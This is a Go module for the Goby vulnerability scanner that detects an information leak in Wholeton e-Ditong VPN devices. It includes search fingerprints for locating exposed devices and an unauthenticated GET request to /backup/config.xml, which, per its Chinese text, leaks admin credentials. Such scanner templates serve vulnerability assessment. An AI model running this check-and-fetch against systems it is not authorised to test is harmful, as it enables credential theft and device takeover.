package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Wheelon-e Ditong VPN infoformation leakage",
    "Description": "<p></p>Wheelon-e Ditong VPN is a next-generation application-layer firewall hardware device, suitable for small and medium-sized enterprises. Wheelton-e Ditong VPN has information leakage in /backup/config.xml.<p></p>",
    "Impact": "Wheelon-e Ditong VPN infoformation leakage",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If unnecessary, prohibit public access to the system. </p>",
    "Product": "Wheeler_e_VPN",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "惠尔顿-e地通VPN信息泄露",
            "Description": "<p><span style=\"font-size: medium;\">惠尔顿-e地通VPN是下一代的应用层防火墙硬件设备，适用于中小型企业。<span style=\"color: rgb(22, 51, 102); font-size: medium;\">惠尔顿-e地通VPN在</span>/backup/config.xml存在信息泄露。</span><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: medium;\">惠尔顿-e地通VPN在</span><span style=\"color: rgb(22, 51, 102); font-size: medium;\">/backup/config.xml存在信息泄露。</span>攻击者可利用信息泄漏，获取管理账号密码，直接登录设备，以及其它账号、信息、配置等。<br></p>",
            "Recommendation": "<p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Product": "惠尔顿-e地通VPN",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Wheelon-e Ditong VPN infoformation leakage",
            "Description": "<p></p >Wheelon-e Ditong VPN is a next-generation application-layer firewall hardware device, suitable for small and medium-sized enterprises. Wheelton-e Ditong VPN has information leakage in /backup/config.xml.<p></p >",
            "Impact": "Wheelon-e Ditong VPN infoformation leakage",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p ><p>2. If unnecessary, prohibit public access to the system. </p>",
            "Product": "Wheeler_e_VPN",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "(body=\"images/l_name.jpg\" && body=\"jtpsoft STYLE1\")",
    "GobyQuery": "(body=\"images/l_name.jpg\" && body=\"jtpsoft STYLE1\")",
    "Author": "goodnight_meow@protonmail.com",
    "Homepage": "http://wholeton.com/",
    "DisclosureDate": "2021-12-30",
    "References": [
        "https://poc.shuziguanxing.com/?#/publicIssueInfo#issueId=1820"
    ],
    "HasExp": false,
    "Is0day": false,
    "Level": "2",
    "CVSS": "5.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/backup/config.xml",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "config",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/backup/config.xml",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "config",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10253"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
